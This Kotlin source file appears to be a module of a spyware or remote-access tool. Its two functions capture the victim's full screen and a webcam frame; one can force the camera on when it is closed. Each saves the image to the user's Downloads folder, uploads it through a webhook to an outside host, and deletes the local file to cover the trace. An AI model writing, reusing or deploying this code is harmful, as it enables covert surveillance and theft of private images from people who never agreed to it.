import com.github.sarxos.webcam.Webcam
import java.awt.Rectangle
import java.awt.Robot
import java.awt.Toolkit
import java.io.File
import javax.imageio.ImageIO

object Screen {
    fun sendScreenshot() {
        val file = File("C:\\Users\\${Main.user}\\Downloads\\screenshot.png")
        val image = Robot().createScreenCapture(Rectangle(Toolkit.getDefaultToolkit().screenSize))
        ImageIO.write(image, "png", file)

        Main.generateWebhook().apply {
            attachments.add(file)
            execute()
        }

        file.delete()
    }

    fun sendWebcam(force: Boolean = false) {
        val file = File("C:\\Users\\${Main.user}\\Downloads\\webcam.png")
        val cam = Webcam.getDefault()
        if (!force && !cam.isOpen) return
        if (!cam.isOpen) cam.open()
        ImageIO.write(cam.image, "png", file)
        cam.close()
        Main.generateWebhook().apply {
            attachments.add(file)
            execute()
        }
        file.delete()
    }
}